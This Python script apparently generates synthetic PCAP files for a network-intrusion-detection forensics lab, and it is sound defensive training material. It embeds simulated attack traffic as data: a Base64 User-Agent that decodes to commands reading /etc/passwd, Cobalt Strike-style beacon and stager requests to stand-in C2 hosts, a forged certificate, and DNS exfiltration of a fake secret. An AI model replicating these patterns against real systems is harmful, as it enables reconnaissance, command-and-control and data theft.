#!/usr/bin/env python3
"""
Deterministic PCAP Generator for Project 2: NIDS & Traffic Forensics Lab.
Generates 6 RFC-compliant PCAP files for live tcpreplay across soc-bridge (virbr1).
"""

import os
import struct
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

PCAP_DIR = os.path.expanduser("~/Cybersecurity/Project-2-NIDS-Forensics-Lab/pcaps")
os.makedirs(PCAP_DIR, exist_ok=True)

# Virtual MACs (unknown to virbr1 FDB so bridge floods frames to promiscuous enp7s0)
MAC_EXT = bytes.fromhex("020000aa0001")
MAC_INT = bytes.fromhex("020000bb0002")

BASE_TS = 1794498000  # Fixed realistic epoch base


def ip_bytes(ip_str: str) -> bytes:
    return bytes(int(x) for x in ip_str.split("."))


def checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def build_ipv4(src_ip: str, dst_ip: str, proto: int, payload: bytes, ident: int = 1000) -> bytes:
    total_len = 20 + len(payload)
    hdr_no_csum = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len, ident & 0xFFFF, 0x4000, 64, proto, 0,
        ip_bytes(src_ip), ip_bytes(dst_ip),
    )
    csum = checksum(hdr_no_csum)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len, ident & 0xFFFF, 0x4000, 64, proto, csum,
        ip_bytes(src_ip), ip_bytes(dst_ip),
    )
    return hdr + payload


def build_tcp(src_ip: str, dst_ip: str, sport: int, dport: int, seq: int, ack: int, flags: int, payload: bytes = b"") -> bytes:
    tcp_no_csum = struct.pack(
        "!HHIIBBHHH",
        sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, (5 << 4), flags, 64240, 0, 0
    ) + payload
    pseudo = struct.pack("!4s4sBBH", ip_bytes(src_ip), ip_bytes(dst_ip), 0, 6, len(tcp_no_csum))
    csum = checksum(pseudo + tcp_no_csum)
    tcp_hdr = struct.pack(
        "!HHIIBBHHH",
        sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, (5 << 4), flags, 64240, csum, 0
    )
    return tcp_hdr + payload


def build_udp(src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes) -> bytes:
    length = 8 + len(payload)
    udp_no_csum = struct.pack("!HHHH", sport, dport, length, 0) + payload
    pseudo = struct.pack("!4s4sBBH", ip_bytes(src_ip), ip_bytes(dst_ip), 0, 17, length)
    csum = checksum(pseudo + udp_no_csum) or 0xFFFF
    return struct.pack("!HHHH", sport, dport, length, csum) + payload


def eth_frame(src_mac: bytes, dst_mac: bytes, ip_pkt: bytes) -> bytes:
    return dst_mac + src_mac + b"\x08\x00" + ip_pkt


def write_pcap(filename: str, packets: list[tuple[float, bytes]]) -> str:
    path = os.path.join(PCAP_DIR, filename)
    with open(path, "wb") as f:
        # Global PCAP header (microsecond resolution, Ethernet LINKTYPE=1)
        f.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for ts, frame in packets:
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)
    return path


def tcp_handshake(src_ip, dst_ip, sport, dport, src_mac, dst_mac, t_start, c_seq=1000, s_seq=5000):
    pkts = []
    # SYN
    pkts.append((t_start, eth_frame(src_mac, dst_mac, build_ipv4(src_ip, dst_ip, 6, build_tcp(src_ip, dst_ip, sport, dport, c_seq, 0, 0x02), 100))))
    # SYN-ACK
    pkts.append((t_start + 0.01, eth_frame(dst_mac, src_mac, build_ipv4(dst_ip, src_ip, 6, build_tcp(dst_ip, src_ip, dport, sport, s_seq, c_seq + 1, 0x12), 101))))
    # ACK
    pkts.append((t_start + 0.02, eth_frame(src_mac, dst_mac, build_ipv4(src_ip, dst_ip, 6, build_tcp(src_ip, dst_ip, sport, dport, c_seq + 1, s_seq + 1, 0x10), 102))))
    return pkts, c_seq + 1, s_seq + 1, t_start + 0.03


def tcp_teardown(src_ip, dst_ip, sport, dport, src_mac, dst_mac, c_seq, s_seq, t):
    pkts = []
    pkts.append((t, eth_frame(src_mac, dst_mac, build_ipv4(src_ip, dst_ip, 6, build_tcp(src_ip, dst_ip, sport, dport, c_seq, s_seq, 0x11), 900))))
    pkts.append((t + 0.01, eth_frame(dst_mac, src_mac, build_ipv4(dst_ip, src_ip, 6, build_tcp(dst_ip, src_ip, dport, sport, s_seq, c_seq + 1, 0x11), 901))))
    pkts.append((t + 0.02, eth_frame(src_mac, dst_mac, build_ipv4(src_ip, dst_ip, 6, build_tcp(src_ip, dst_ip, sport, dport, c_seq + 1, s_seq + 1, 0x10), 902))))
    return pkts


# ------------------------------------------------------------------------------
# 1. Nmap Half-Open SYN Scan (MITRE T1046)
# ------------------------------------------------------------------------------
def gen_syn_scan():
    pkts = []
    attacker = "45.33.32.156"
    victim = "192.168.100.50"
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
             1433, 1521, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9000, 9200,
             27017, 5000, 5001, 6667, 10000, 4444, 1337, 31337]
    t = float(BASE_TS)
    for idx, port in enumerate(ports):
        sport = 40000 + idx
        seq = 10000 + idx * 100
        # Raw SYN (S0 in Zeek if unanswered)
        pkts.append((t, eth_frame(MAC_EXT, MAC_INT, build_ipv4(attacker, victim, 6, build_tcp(attacker, victim, sport, port, seq, 0, 0x02), 2000 + idx))))
        # Send RST-ACK on a few closed ports so Zeek logs REJ too
        if port in (21, 23, 445, 3389, 8080):
            pkts.append((t + 0.005, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, attacker, 6, build_tcp(victim, attacker, port, sport, 0, seq + 1, 0x14), 3000 + idx))))
        t += 0.02
    return write_pcap("01_nmap_syn_scan.pcap", pkts)


# ------------------------------------------------------------------------------
# 2. Base64-Encoded HTTP User-Agent C2 (MITRE T1071.001)
# ------------------------------------------------------------------------------
def gen_base64_ua():
    attacker = "185.220.101.15"
    victim = "192.168.100.20"
    t = float(BASE_TS + 10)
    pkts, c_seq, s_seq, t = tcp_handshake(attacker, victim, 51234, 80, MAC_EXT, MAC_INT, t)
    # Decodes to: "whoami && id && uname -a && cat /etc/passwd"
    b64_ua = "d2hvYW1pICYmIGlkICYmIHVuYW1lIC1hICYmIGNhdCAvZXRjL3Bhc3N3ZA=="
    http_req = (
        f"GET /admin/panel.php HTTP/1.1\r\n"
        f"Host: 192.168.100.20\r\n"
        f"User-Agent: {b64_ua}\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    pkts.append((t, eth_frame(MAC_EXT, MAC_INT, build_ipv4(attacker, victim, 6, build_tcp(attacker, victim, 51234, 80, c_seq, s_seq, 0x18, http_req), 200))))
    c_seq += len(http_req)
    http_resp = b"HTTP/1.1 200 OK\r\nServer: Apache/2.4.58\r\nContent-Length: 13\r\nConnection: close\r\n\r\nOK_EXECUTED\r\n"
    pkts.append((t + 0.02, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, attacker, 6, build_tcp(victim, attacker, 80, 51234, s_seq, c_seq, 0x18, http_resp), 201))))
    s_seq += len(http_resp)
    pkts.extend(tcp_teardown(attacker, victim, 51234, 80, MAC_EXT, MAC_INT, c_seq, s_seq, t + 0.04))
    return write_pcap("02_base64_ua_c2.pcap", pkts)


# ------------------------------------------------------------------------------
# 3. Unauthorized Outbound SSH Egress Tunnel on Port 443 (MITRE T1572)
# ------------------------------------------------------------------------------
def gen_ssh_tunnel():
    victim = "192.168.100.50"
    c2_ssh = "198.51.100.99"
    t = float(BASE_TS + 20)
    pkts, c_seq, s_seq, t = tcp_handshake(victim, c2_ssh, 49152, 443, MAC_INT, MAC_EXT, t)
    c_banner = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n"
    s_banner = b"SSH-2.0-OpenSSH_9.2p1 Debian-2\r\n"
    pkts.append((t, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, c2_ssh, 6, build_tcp(victim, c2_ssh, 49152, 443, c_seq, s_seq, 0x18, c_banner), 300))))
    c_seq += len(c_banner)
    pkts.append((t + 0.02, eth_frame(MAC_EXT, MAC_INT, build_ipv4(c2_ssh, victim, 6, build_tcp(c2_ssh, victim, 443, 49152, s_seq, c_seq, 0x18, s_banner), 301))))
    s_seq += len(s_banner)
    # Simulated encrypted SSH tunnel bytes outbound
    enc_blob = bytes((i * 37) % 256 for i in range(512))
    pkts.append((t + 0.05, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, c2_ssh, 6, build_tcp(victim, c2_ssh, 49152, 443, c_seq, s_seq, 0x18, enc_blob), 302))))
    c_seq += len(enc_blob)
    pkts.extend(tcp_teardown(victim, c2_ssh, 49152, 443, MAC_INT, MAC_EXT, c_seq, s_seq, t + 0.1))
    return write_pcap("03_ssh_egress_tunnel.pcap", pkts)


# ------------------------------------------------------------------------------
# 4. Cobalt Strike / Sliver HTTP Beaconing + Binary Staging (MITRE T1071)
# ------------------------------------------------------------------------------
def gen_c2_beacon():
    victim = "192.168.100.50"
    c2 = "203.0.113.66"
    pkts = []
    t = float(BASE_TS + 30)
    # 4 periodic heartbeat beacons every 5.0s
    for i in range(4):
        sport = 52000 + i
        hp, c_seq, s_seq, ts = tcp_handshake(victim, c2, sport, 80, MAC_INT, MAC_EXT, t, c_seq=1000*(i+1), s_seq=5000*(i+1))
        pkts.extend(hp)
        req = f"GET /submit.php?id=deadbeef HTTP/1.1\r\nHost: cdn-telemetry.bad\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
        pkts.append((ts, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, c2, 6, build_tcp(victim, c2, sport, 80, c_seq, s_seq, 0x18, req), 400 + i))))
        c_seq += len(req)
        resp = b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\nConnection: close\r\n\r\nNOP\n"
        pkts.append((ts + 0.02, eth_frame(MAC_EXT, MAC_INT, build_ipv4(c2, victim, 6, build_tcp(c2, victim, 80, sport, s_seq, c_seq, 0x18, resp), 410 + i))))
        s_seq += len(resp)
        pkts.extend(tcp_teardown(victim, c2, sport, 80, MAC_INT, MAC_EXT, c_seq, s_seq, ts + 0.04))
        t += 5.0

    # Stager download (4-char Cobalt Strike checksum URI + simulated ELF payload for Wireshark HTTP Export)
    sport = 52010
    hp, c_seq, s_seq, ts = tcp_handshake(victim, c2, sport, 80, MAC_INT, MAC_EXT, t, c_seq=9000, s_seq=19000)
    pkts.extend(hp)
    req = b"GET /aB3z HTTP/1.1\r\nHost: cdn-telemetry.bad\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
    pkts.append((ts, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, c2, 6, build_tcp(victim, c2, sport, 80, c_seq, s_seq, 0x18, req), 450))))
    c_seq += len(req)
    fake_elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"SOC_LAB_COBALT_STRIKE_SIMULATED_STAGER_PAYLOAD_DO_NOT_EXECUTE_" + b"\x90" * 64
    resp = (
        f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Disposition: attachment; filename=\"beacon_stage.bin\"\r\n"
        f"Content-Length: {len(fake_elf)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + fake_elf
    pkts.append((ts + 0.03, eth_frame(MAC_EXT, MAC_INT, build_ipv4(c2, victim, 6, build_tcp(c2, victim, 80, sport, s_seq, c_seq, 0x18, resp), 451))))
    s_seq += len(resp)
    pkts.extend(tcp_teardown(victim, c2, sport, 80, MAC_INT, MAC_EXT, c_seq, s_seq, ts + 0.06))
    return write_pcap("04_cobalt_strike_beacon_staging.pcap", pkts)


# ------------------------------------------------------------------------------
# 5. Rogue Cobalt Strike TLS Certificate (Serial 08:bb:00:ee / 146473198)
# ------------------------------------------------------------------------------
def build_cs_cert_der() -> bytes:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Washington"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "Redmond"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Microsoft Corporation"),
        x509.NameAttribute(NameOID.COMMON_NAME, "Major Cobalt Strike"),
    ])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(0x08BB00EE)  # 146473198 -> 08:bb:00:ee
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.DER)


def tls_record(content_type: int, version: int, payload: bytes) -> bytes:
    return struct.pack("!BHH", content_type, version, len(payload)) + payload


def tls_hs_msg(hs_type: int, body: bytes) -> bytes:
    return bytes([hs_type]) + len(body).to_bytes(3, "big") + body


def gen_rogue_tls():
    victim = "192.168.100.50"
    c2_tls = "198.51.100.77"
    t = float(BASE_TS + 60)
    pkts, c_seq, s_seq, t = tcp_handshake(victim, c2_tls, 53111, 8443, MAC_INT, MAC_EXT, t)

    # TLS 1.2 ClientHello with SNI
    sni_host = b"cdn-update.evil-c2.net"
    sni_entry = struct.pack("!BH", 0, len(sni_host)) + sni_host
    sni_list = struct.pack("!H", len(sni_entry)) + sni_entry
    sni_ext = struct.pack("!HH", 0x0000, len(sni_list)) + sni_list
    ciphers = struct.pack("!HH", 2, 0xC02F)  # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    ch_body = (
        struct.pack("!H", 0x0303) +
        b"\x11" * 32 +  # Client Random
        b"\x00" +       # Session ID len 0
        ciphers +
        b"\x01\x00" +   # Compression null
        struct.pack("!H", len(sni_ext)) + sni_ext
    )
    ch_rec = tls_record(22, 0x0301, tls_hs_msg(1, ch_body))
    pkts.append((t, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, c2_tls, 6, build_tcp(victim, c2_tls, 53111, 8443, c_seq, s_seq, 0x18, ch_rec), 500))))
    c_seq += len(ch_rec)

    # TLS 1.2 ServerHello + Certificate (type 11) + ServerHelloDone
    sh_body = struct.pack("!H", 0x0303) + b"\x22" * 32 + b"\x00" + struct.pack("!HB", 0xC02F, 0)
    cert_der = build_cs_cert_der()
    cert_entry = len(cert_der).to_bytes(3, "big") + cert_der
    cert_list = len(cert_entry).to_bytes(3, "big") + cert_entry
    srv_flight = (
        tls_record(22, 0x0303, tls_hs_msg(2, sh_body)) +
        tls_record(22, 0x0303, tls_hs_msg(11, cert_list)) +
        tls_record(22, 0x0303, tls_hs_msg(14, b""))
    )
    # Segment flight cleanly at <= 1400 bytes so MTU 1500 is respected
    offset = 0
    pkt_id = 501
    cur_t = t + 0.02
    while offset < len(srv_flight):
        chunk = srv_flight[offset:offset + 1400]
        flags = 0x18 if offset + 1400 >= len(srv_flight) else 0x10
        pkts.append((cur_t, eth_frame(MAC_EXT, MAC_INT, build_ipv4(c2_tls, victim, 6, build_tcp(c2_tls, victim, 8443, 53111, s_seq, c_seq, flags, chunk), pkt_id))))
        s_seq += len(chunk)
        offset += len(chunk)
        pkt_id += 1
        cur_t += 0.002

    pkts.extend(tcp_teardown(victim, c2_tls, 53111, 8443, MAC_INT, MAC_EXT, c_seq, s_seq, cur_t + 0.02))
    return write_pcap("05_rogue_tls_cobalt_strike.pcap", pkts)


# ------------------------------------------------------------------------------
# 6. DNS Data Exfiltration Tunnel (MITRE T1048.003)
# ------------------------------------------------------------------------------
def encode_dns_name(domain: str) -> bytes:
    out = b""
    for label in domain.split("."):
        b = label.encode()
        out += bytes([len(b)]) + b
    return out + b"\x00"


def gen_dns_exfil():
    victim = "192.168.100.50"
    dns_srv = "198.51.100.53"
    secret = b"CONFIDENTIAL_SOC_SECRET:db_pass=S3cr3tP@ss2026!;api_key=AKIA9988776655443322"
    hex_payload = secret.hex()
    # Split into 40-char chunks (>35 chars threshold for Suricata Rule 6)
    chunks = [hex_payload[i:i + 40] for i in range(0, len(hex_payload), 40)]

    pkts = []
    t = float(BASE_TS + 80)
    for idx, chunk in enumerate(chunks):
        txid = 0x4200 + idx
        qname = f"{chunk}.exfil.evil-dns-c2.com"
        q_wire = encode_dns_name(qname) + struct.pack("!HH", 1, 1)  # Type A, Class IN
        dns_query = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + q_wire
        sport = 55000 + idx
        pkts.append((t, eth_frame(MAC_INT, MAC_EXT, build_ipv4(victim, dns_srv, 17, build_udp(victim, dns_srv, sport, 53, dns_query), 600 + idx))))

        # DNS Reply (127.0.0.1 ACK)
        ans_rr = struct.pack("!HHHIH", 0xC00C, 1, 1, 60, 4) + ip_bytes("127.0.0.1")
        dns_resp = struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + q_wire + ans_rr
        pkts.append((t + 0.015, eth_frame(MAC_EXT, MAC_INT, build_ipv4(dns_srv, victim, 17, build_udp(dns_srv, victim, 53, sport, dns_resp), 700 + idx))))
        t += 0.25

    return write_pcap("06_dns_exfiltration.pcap", pkts)


if __name__ == "__main__":
    files = [
        gen_syn_scan(),
        gen_base64_ua(),
        gen_ssh_tunnel(),
        gen_c2_beacon(),
        gen_rogue_tls(),
        gen_dns_exfil(),
    ]
    for path in files:
        print(f"Generated: {path}")
